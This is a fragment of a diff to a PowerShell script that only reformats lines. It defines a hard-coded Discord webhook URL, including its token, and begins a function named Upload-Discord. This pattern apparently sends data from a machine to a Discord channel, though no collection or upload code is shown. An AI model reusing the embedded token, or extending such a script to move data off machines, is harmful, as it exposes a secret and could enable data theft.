@@ -1,4 +1,5 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $webhookUrl = "https://discord.com/api/webhooks/1291043643804614757/c1V5o7T1Ss0t1fMThP98fAZK9mFCrB9tK4gCWProZ3RgHdl1VHvBy_lGudQPI_eVWKsc"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
+$webhookUrl = "https://discord.com/api/webhooks/1291043643804614757/c1V5o7T1Ss0t1fMThP98fAZK9mFCrB9tK4gCWProZ3RgHdl1VHvBy_lGudQPI_eVWKsc"
 function Upload-Discord {
     [CmdletBinding()]
     param (
